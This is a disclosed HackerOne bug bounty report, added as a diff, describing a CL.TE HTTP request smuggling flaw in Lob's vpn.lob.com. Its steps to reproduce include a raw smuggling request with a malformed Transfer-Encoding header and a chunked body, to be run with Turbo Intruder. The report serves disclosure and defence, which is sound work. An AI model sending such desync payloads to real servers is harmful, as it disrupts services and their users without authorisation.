@@ -1,0 +1,51 @@
+ReportLink:https://hackerone.com/reports/694604
+WeaknessName:HTTP Request Smuggling
+Reporter:https://hackerone.com/painreigns
+ReportedTo:Lob(lob)
+BountyAmount:500.0
+Severity:medium
+State:Closed
+DateOfDisclosure:27.11.2019 21:22:56
+
+Summary:
+
+Hi ,
+
+vpn.lob.com is vulnerable to CL TE ( Front end server uses Content-Length , Back-end Server uses Transfer-encoding ) HTTP request smuggling attack.
+
+**Steps to reproduce** 
+1. Run the burp suite turbo intruder on the following request 
+
+```
+POST /auth/session HTTP/1.1
+Host: vpn.lob.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 50
+Connection: close
+Referer: https://vpn.lob.com/login
+Cookie: _vwo_uuid_v2=D7FF7EABF1E283CDC77767B75ABC4FA51|74f99aef48c9151f1dd02b48985a0238; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%22b0bd8d42-5f78-4a1b-8de8-20f4f245fc62%22; amplitude_id_0140e3eb2f7505ea65a1fa2a4e6e4c1flob.com=eyJkZXZpY2VJZCI6IjgwMzgyZjJmLWM1NDctNDM1Mi04NWU4LWI0ZGMxYjQ1MjAxZFIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU2NTUwNTA1ODcxMywibGFzdEV2ZW50VGltZSI6MTU2NTUwNTE2NjQ5NSwiZXZlbnRJZCI6MCwiaWRlbnRpZnlJZCI6MCwic2VxdWVuY2VOdW1iZXIiOjB9; intercom-id-wmjqtt9h=caf415b8-9c72-480c-b8ae-c1766163f6c6; __zlcmid=rmi9oFUDOriRTh; zarget_visitor_info=%7B%22BRXP%5BP_%22%3A1391918%2C%22BRXRPWP%22%3A1393270%7D; zarget_user_id=1561904574648r0.7869595723975263; landing_url=bG9iLmNvbS8=; zarget_goal_info=%7B%224752515957574A425C5B5C5842594C5E5E5659585E57%22%3A%5B1391658%5D%7D
+Transfer-Encoding : chunked
+
+27
+{"username":"admin","password":"admin"}
+0
+
+
+```
+
+2. Script for the turbo intruder is attached with name script.txt
+
+3. Observe 200 OK response for the auth/session post request which is supposed to give invalid credentials.Please refer the attached screenshots. ( Smuggle Request1.png ) 
+4. This successfully confirms vulnerability.Please refer attached screenshot ( Final Response.png ). Also attached the recorded POC for the finding.
+
+## Impact
+
+It is possible to smuggle the request and disrupt the user experience.
+Ex : redirecting to 404 not found page , improper response from server 
+As unauthenticated testing is performed the exact impact of the vulnerability cannot be predicted.
+
+For more information about the vulnerability please refer : https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn
